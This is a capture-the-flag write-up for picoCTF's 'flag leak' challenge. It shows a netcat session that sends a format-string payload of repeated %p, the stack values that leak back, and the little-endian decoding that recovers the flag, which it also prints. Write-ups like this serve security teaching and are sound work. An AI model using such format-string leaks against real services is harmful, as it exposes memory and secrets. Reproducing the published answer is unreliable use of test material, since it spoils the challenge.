# flag leak

### Description
> Story telling class 1/2

### Solution
The bug is `Format String Bug` , which read a value in the stack.
The value of flag is stored in stack, you can get the flag.

```
$ nc saturn.picoctf.net 51466
Tell me a story and then I'll tell you one >> %p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
Here's a story -
0xffe7c4700xffe7c4900x80493460x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x2570250x6f6369700x7b4654430x6b34334c0x5f676e310x67346c460x6666305f0x3474535f0x645f6b630x306237390x7d3439640xfbad20000xf1a82a00(nil)0xf7f119900x804c0000x8049410(nil)0x804c0000xffe7c5580x80494180x20xffe7c6040xffe7c610(nil)0xffe7c570(nil)(nil)0xf7d07ee5
```

`picoCTF{` is `7b4654436f636970` in ASCII, so you look for it.
Note that it is little edian.

Therefore,

```
0x7b4654430x6b34334c0x5f676e310x67346c460x6666305f0x3474535f0x645f6b630x306237390x7d343964
```

Flag is `picoCTF{L34k1ng_Fl4g_0ff_St4ck_d97b0d94}`

### Writer
[yu1hpa](https://twitter.com/yu1hpa)

